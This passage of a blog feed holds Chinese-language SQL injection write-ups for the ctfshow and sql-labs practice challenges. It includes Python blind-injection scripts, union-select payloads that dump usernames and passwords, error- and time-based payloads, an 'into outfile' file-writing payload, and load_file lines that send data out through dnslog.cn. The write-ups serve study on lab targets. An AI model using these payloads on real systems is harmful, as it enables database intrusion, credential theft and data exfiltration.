class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">    print(<span class="string">f&quot;The number is: <span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: <span class="string">&quot;ctfshow_user group by pass having pass like &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;0x&quot;</span>+str_to_hex(result+j+<span class="string">&quot;%&quot;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 1;&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            result += j</span><br><span class="line">            print(<span class="string">f&quot;[+] Result now is: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure><h2 id="web185-186"><a href="#web185-186" class="headerlink" title="web185-186"></a>web185-186</h2><p>这题过滤了更多的东西，甚至把数字都过滤了_(¦3」∠)_</p><p>去搜了搜，在Y4师傅那里发现了一张图</p><p><img src="https://i.loli.net/2021/04/06/qQS6KvFXDW41uki.png"></p><p>发现可以上true</p><p>这里是脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;url_here&#x27;</span></span><br><span class="line">flagstr = <span class="string">&#x27;&#123;cqwertyuiopasdfghjklzxvbnm-0123456789&#125;&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Num</span>(<span class="params">n</span>):</span></span><br><span class="line">    num = <span class="string">&quot;true&quot;</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> num</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">            num += <span class="string">&quot;+true&quot;</span></span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Numstr</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="built_in">str</span> += <span class="string">&quot;chr(&quot;</span>+Num(<span class="built_in">ord</span>(s[<span class="number">0</span>]))+<span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s[<span class="number">1</span>:]:</span><br><span class="line">        <span class="built_in">str</span> += <span class="string">&quot;,chr(&quot;</span>+Num(<span class="built_in">ord</span>(i))+<span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">    print(<span class="string">f&quot;The number is: <span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: <span class="string">&quot;ctfshow_user group by pass having pass like(concat(&#123;&#125;))&quot;</span>.<span class="built_in">format</span>(Numstr(result+j+<span class="string">&quot;%&quot;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 0;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            result += j</span><br><span class="line">            print(<span class="string">f&quot;[+] Result now is: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure><h2 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h2><p>绕过md5($str,true)，直接用户名填写<code>admin</code>密码为<code>ffifdyop</code></p><p>原理的话在这里<a href="https://blog.csdn.net/solitudi/article/details/107813286?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160631731619195283021913%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=160631731619195283021913&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-1-107813286.pc_v2_rank_blog_default&utm_term=md5%20%20_POST%20%20password%20%20,true&spm=1018.2118.3001.4450">[SQL绕过]md5($str,true)类型绕过</a></p><p>然后F12抓个包就可以看到flag了</p><p><img src="https://i.loli.net/2021/04/06/cLivMjtPBDVw5au.png"></p><h2 id="web188"><a href="#web188" class="headerlink" title="web188"></a>web188</h2><p>这题是纯知识盲区∑(っ°Д°;)っ</p><p>咱们可以这样子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="number">0</span>&amp;password=<span class="number">0</span></span><br></pre></td></tr></table></figure><p>为什么呢↓</p><p>在sql查询时，<code>where username=0</code>这样的查询中，因为数据库里的<code>username</code>都会是字符串，而在<strong>mysql</strong>中字符串与数字进行比较的时候，以字母开头的字符串都会转换成数字0，因此这个<code>where</code>条件可以把所有以字母开头的数据查出来</p><p>而<code>passwor=0</code>则是因为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==intval(<span class="variable">$password</span>) <span class="comment"># 弱类型比较</span></span><br><span class="line"><span class="comment"># 因为pass查出来的数据也会是以字母开头的，所有password=0可以利用弱类型比较得到flag</span></span><br></pre></td></tr></table></figure><p>而这样也可以把东西查出来</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="number">1</span>&lt;<span class="number">1</span>&amp;password=<span class="number">0</span></span><br><span class="line">username=<span class="number">1</span>||<span class="number">1</span>&amp;password=<span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="web189"><a href="#web189" class="headerlink" title="web189"></a>web189</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ctfshow-SQL&quot;&gt;&lt;a href=&quot;#ctfshow-SQL&quot; class=&quot;headerlink&quot; title=&quot;ctfshow SQL&quot;&gt;&lt;/a&gt;ctfshow SQL&lt;/h1&gt;&lt;p&gt;刷一刷ctfshow的sql题，提升一下sql方面的缺陷&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="Web" scheme="https://rossweisse.github.io/categories/Web/"/>
    
    
    <category term="sql" scheme="https://rossweisse.github.io/tags/sql/"/>
    
    <category term="ctfshow" scheme="https://rossweisse.github.io/tags/ctfshow/"/>
    
  </entry>
  
  <entry>
    <title>Sql-Labs</title>
    <link href="https://rossweisse.github.io/2021/02/07/web%E5%AD%A6%E4%B9%A0/sql-labs/"/>
    <id>https://rossweisse.github.io/2021/02/07/web%E5%AD%A6%E4%B9%A0/sql-labs/</id>
    <published>2021-02-07T15:38:00.000Z</published>
    <updated>2021-07-23T03:27:19.148Z</updated>
    
    <content type="html"><![CDATA[<p>sql-labs-less-1-10</p><a id="more"></a><h1 id="Less-1-基于’-的字符型注入"><a href="#Less-1-基于’-的字符型注入" class="headerlink" title="Less-1-基于’ 的字符型注入"></a>Less-1-基于’ 的字符型注入</h1><p>进去后老套路</p><p>先测试一下注入点</p><blockquote><p>id=1’ and 1=1 –+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/e974130e6213715867b0a5b332150a8c.png"></p><p>把1=1换成1=2</p><blockquote><p>id=1‘  and 1=2 –+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/8792b518d8154c5ccc0b6e072876661d.png"></p><p>发现没有报错，也没有显示错误信息，说明可以使用 ‘ 字符注入</p><p>查询有多少列</p><blockquote><p>id=1’ order by 4 –+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/642125828168fb5342d7dc127e2fccd3.png"></p><p>出现错误，证明表中只有三列</p><p>判断显示点</p><blockquote><p>id=-1’ union select 1,2,3 –+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/2f3d76328e8ba05b0004fd749abd53a0.png"></p><p>查询用户，数据库</p><blockquote><p>id=-1’ union select 1,user(),database() –+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/846d30e188f1547591acea4bf8b852cf.png"></p><p>查询用户名，密码</p><blockquote><p>id=-1’ union select 1,(select group_concat(concat_ws(‘—‘,username,password)) from users),3 –+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/c8e1124e5d208d21bf60a1522dc9975b.png"></p><h1 id="Less-2-数字型注入"><a href="#Less-2-数字型注入" class="headerlink" title="Less-2-数字型注入"></a>Less-2-数字型注入</h1><p>由提示知道是整数型注入</p><p>老套路</p><blockquote><p>id=1 and 1=1 –+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/2c1f549f4c118fb6be5f6aeb633b17b3.png"></p><p>吧1=1换成1=2</p><blockquote><p>id=1 and 1=2 –+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/bc45f5df67356a6296e570c0b06e27f2.png"></p><p>没有错误，也没有回显，说明为数字型注入</p><p>查询有多少列</p><blockquote><p>id=1 order by 4 –+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/7a7b987b06c113264fc76ff59bdab201.png"></p><p>查询显示点</p><blockquote><p>id=-1 union select 1,2,3 –+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/4ebec5db0104a132a7b042c371f940e2.png"></p><p>查询用户名，密码</p><blockquote><p>id=-1 union select 1,(select group_concat(concat_ws(“—“,username,password)) from users),3 –+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/74bfa2cfcb47bb7ad33d3a418d4baee6.png"></p><h1 id="Less-3-基于’-的字符注入"><a href="#Less-3-基于’-的字符注入" class="headerlink" title="Less-3-基于’) 的字符注入"></a>Less-3-基于’) 的字符注入</h1><p>提示是弯曲的字符，可以猜测可能是 ) 字符注入</p><p>可以直接去看代码验证</p><p><img src="https://img-blog.csdnimg.cn/img_convert/1bb2bca05087136a3b13a39703a6473e.png"></p><p>知道了注入点，就开始老套路</p><p>查询列数</p><blockquote><p>id=1’) order by 4 –+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/d04a6ee5cdd6fc1d6c785871071abe8b.png"></p><p>查询显示点</p><blockquote><p>id=-1’) union select 1,2,3 –+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/468064452acf79cc9c0725801c5ff326.png"></p><p>查询用户名，密码</p><blockquote><p>id=-1’) union select 1,(select group_concat(concat_ws(“—“,username,password)) from users),3 –+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/e4e3ad10e7ba5a5a956ddc82f8c0c100.png"></p><h1 id="Less-4-基于”-的字符型注入"><a href="#Less-4-基于”-的字符型注入" class="headerlink" title="Less-4-基于”) 的字符型注入"></a>Less-4-基于”) 的字符型注入</h1><p>根据提示可以知道，这题是双引号字符注入<br>测试注入点，刚开始还以为是只有双引号的注入点</p><blockquote><p>id=1” and 1=1 –+</p></blockquote><p>结果提示错误了<br><img src="https://img-blog.csdnimg.cn/20210206112347169.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">于是我就猜测可能是包括了上一题的 ) 字符注入点，在后面加个 )</p><blockquote><p>id=1”) and 1=1 –+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210206112458418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">有反应了，继续测试</p><blockquote><p>id=1”) and 1=1 –+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210206112557663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">没有提示错误也没有回显，说明注入点正确，接下来就是老套路了</p><blockquote><p>id=1”) order by 4 –+ //查询列<br>id=-1”) union select 1,2,3 –+ //查询显示点<br>id=-1”) union select 1,(select group_concat(concat_ws(“—“,username,password)) from users),3 –+ //查询用户名，密码</p></blockquote><p>最终结果<br><img src="https://img-blog.csdnimg.cn/20210206112921881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-5-基于’-的报错注入"><a href="#Less-5-基于’-的报错注入" class="headerlink" title="Less-5-基于’ 的报错注入"></a>Less-5-基于’ 的报错注入</h1><p>题目刚开始给了个double query的提示，由于是第一次见，没明白是啥意思。<br>就开始常规的测试一下注入点</p><blockquote><p>id=1’ and 1=1 –+<br>id=1’ and 1=2 –+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210206120620545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20210206120634918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">发现字符注入可行，查询一下列数</p><blockquote><p>id=1’ order by 4 –+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210206120737992.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">然后查显示点的时候，发现一个很严重的问题，题目没有给出显示点</p><blockquote><p>id=-1’ union select 1,2,3 –+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210206120858544.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">还没见过这种类型题，于是去看了眼源码<br><img src="https://img-blog.csdnimg.cn/20210206184538545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>在这看到会输出mysql_error()<br>所以想到了报错注入，因为第一次遇到，所以去找了找报错注入咋搞<br>发现可以updatexml()注入</p><blockquote><p>id=-1’ union select updatexml(1,concat(0x7e,user(),0x7e),1) –+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210206185449491.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h2 id="updatexml-语法"><a href="#updatexml-语法" class="headerlink" title="updatexml()语法"></a>updatexml()语法</h2><p>updatexml()：(XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值</p><p>其实，第一个和第三个参数可以随意填写</p><h1 id="Less-6-基于”-的报错注入"><a href="#Less-6-基于”-的报错注入" class="headerlink" title="Less-6-基于” 的报错注入"></a>Less-6-基于” 的报错注入</h1><p>与上一题同样是报错注入，但是注入点变为了 “ </p><blockquote><p>id=-1” union select updatexml(1,concat(user()),1) –+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210207103757424.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-7-文件读写"><a href="#Less-7-文件读写" class="headerlink" title="Less-7-文件读写"></a>Less-7-文件读写</h1><p>进入题目发现提示是Dump into Outfile，说明要用到文件的读写</p><h2 id="tips："><a href="#tips：" class="headerlink" title="tips："></a>tips：</h2><p>mysql的文件读写函数<strong>load_file</strong>函数与<strong>into outfile</strong>函数只有满足以下条件可以使用:</p><blockquote><p>当前连接的mysql用户为root权限<br>文件权限: chmod a+x pathtofile<br>文件大小: 必须小于max_allowed_packet</p></blockquote><p>文件的读写一般是要通过mysql配置文件的权限才可以使用的，5.5之前的版本是secure_file_priv变量 默认为空 所以直接就可以使用，但是高于5.5时mysql新出了一个secure-file-priv字段<br>所以我们需要更改一下mysql的配置文件，加一行</p><blockquote><p>secure_file_priv= </p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210207160905713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>然后重启一下mysql就可以了。(tips结束<br>进入题目后老方法</p><blockquote><p>id=1’ and 1=1 –+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210207161123726.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">报错了，测试了一会后发现是这样闭合的</p><blockquote><p>id=1’)) and 1=1 –+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210207161223667.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">提示使用outfile()函数<br>于是我们构造一个payload</p><blockquote><p>id=-1’)) union select 1,’这是放木马的’,3 into outfile ‘D:\1.php’ –+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210207161431162.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">进D盘查看文件在不在<br><img src="https://img-blog.csdnimg.cn/2021020716160698.png"><br>然后写个木马进去查看用户名和密码试试</p><blockquote><p>id=-1’)) union select 1,(select group_concat(concat_ws(“—“,username,password)) from users),3 into outfile ‘D:\2.php’ –+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210207161721999.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-8-基于’-的布尔盲注"><a href="#Less-8-基于’-的布尔盲注" class="headerlink" title="Less-8-基于’ 的布尔盲注"></a>Less-8-基于’ 的布尔盲注</h1><p>这题通过提示我们知道可以使用布尔注入，所以我想到了用dns回显来进行数据查看，这里推荐一个网站<a href="http://dnslog.cn/">http://dnslog.cn/</a><br>进入这个网站之后，点击<strong>Get SubDomain</strong>，可以得到一个dns地址<br><img src="https://img-blog.csdnimg.cn/2021020723174412.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">然后编辑注入语句</p><blockquote><p>id=1’ and load_file(concat(“\\“,(database()),”.xk0cq2.dnslog.cn\1.txt”)) –+</p></blockquote><p>注入之后点击Refresh Record即可收到回显结果<br><img src="https://img-blog.csdnimg.cn/20210207232007455.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-9-基于’-的时间盲注"><a href="#Less-9-基于’-的时间盲注" class="headerlink" title="Less-9-基于’ 的时间盲注"></a>Less-9-基于’ 的时间盲注</h1><p>根据提示我们可以知道，这题是基于时间的注入，所以我们可以使用延时注入<br>先构造payload</p><blockquote><p>id=1’ and if(length(database())&gt;5,sleep(5),1) –+</p></blockquote><p>这样，我们就可以通过浏览器的返回时间来判断数据库名的长度<br><img src="https://img-blog.csdnimg.cn/20210207232912577.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><p><img src="https://img-blog.csdnimg.cn/20210207232832546.png"></p><h1 id="Less-10-基于”-的时间盲注"><a href="#Less-10-基于”-的时间盲注" class="headerlink" title="Less-10-基于” 的时间盲注"></a>Less-10-基于” 的时间盲注</h1><p>这题与上图一样，可以使用延时注入，但是注入闭合点换成了”<br>构造payload</p><blockquote><p>id=1” and if(length(database())&gt;5,sleep(5),1) –+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210207233611122.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br><img src="https://img-blog.csdnimg.cn/20210207233637454.png"></p><h1 id="Less-11-基于’-的POST型注入"><a href="#Less-11-基于’-的POST型注入" class="headerlink" title="Less-11-基于’ 的POST型注入"></a>Less-11-基于’ 的POST型注入</h1><p>首先测试注入点</p><blockquote><p>id=1’ and 1=1 –+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210208113829324.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">发现是password那块有问题，于是想到可能是–+注释被ban掉了<br>所以使用#注释</p><blockquote><p>id=1’ and 1=1 #</p></blockquote><p>成功<br><img src="https://img-blog.csdnimg.cn/2021020811392689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>然后是payload</p><blockquote><p>1’ or 1=1 #</p></blockquote><p>成功进入<br><img src="https://img-blog.csdnimg.cn/20210208114314457.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-12-基于”-的POST型注入"><a href="#Less-12-基于”-的POST型注入" class="headerlink" title="Less-12-基于”) 的POST型注入"></a>Less-12-基于”) 的POST型注入</h1><p>看题目说是双引号，于是尝试构造payload</p><blockquote><p>1” ‘ or 1=1 #</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210208114615375.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">查看报错，发现其实是”) 闭合<br>所以重新来一次</p><blockquote><p>1”) or 1=1 #</p></blockquote><p>成功进入<br><img src="https://img-blog.csdnimg.cn/20210208114706613.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-13-基于’-的报错注入"><a href="#Less-13-基于’-的报错注入" class="headerlink" title="Less-13-基于’) 的报错注入"></a>Less-13-基于’) 的报错注入</h1><p>根据题目可以知道是基于) 的报错注入，于是构造测试payload，发现其实是’) 闭合</p><blockquote><p>1’) or 1=1 #</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210208115425692.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>测试显示点发现，这题没有显示点</p><blockquote><p>-1’) union select 1,2 #</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210208115804234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">所以准备用报错注入</p><blockquote><p>-1’) union select updatexml(1,concat(“~”,user(),”—“),1) #</p></blockquote><p>注入成功<br><img src="https://img-blog.csdnimg.cn/2021020812002514.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-14-基于”-的报错注入"><a href="#Less-14-基于”-的报错注入" class="headerlink" title="Less-14-基于”  的报错注入"></a>Less-14-基于”  的报错注入</h1><p>根据题目知道，这题是双引号闭合<br>于是构造payload</p><blockquote><p>1” or 1=1 #</p></blockquote><p>成功进入<br><img src="https://img-blog.csdnimg.cn/20210208120148961.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>与上题一样，没有显示点</p><blockquote><p>-1” union select 1,2 #</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210208120244193.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>于是使用报错注入</p><blockquote><p>-1” union select updatexml(1,concat(“<del>“,user(),”</del>“),1) #</p></blockquote><p>成功注入<br><img src="https://img-blog.csdnimg.cn/20210208120357507.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-15-基于’-的POST型注入"><a href="#Less-15-基于’-的POST型注入" class="headerlink" title="Less-15-基于’ 的POST型注入"></a>Less-15-基于’ 的POST型注入</h1><p>根据提示可知，这题是用的布尔盲注，所以可以尝试使用dns传值<br>首先构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and load_file(concat(&quot;\\\\&quot;,(database()),&quot;.rao80k.dnslog.cn\\1.txt&quot;)) #</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2021020911571117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20210209115721303.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">成功传值</p><h1 id="Less-16-基于”-的POST型注入"><a href="#Less-16-基于”-的POST型注入" 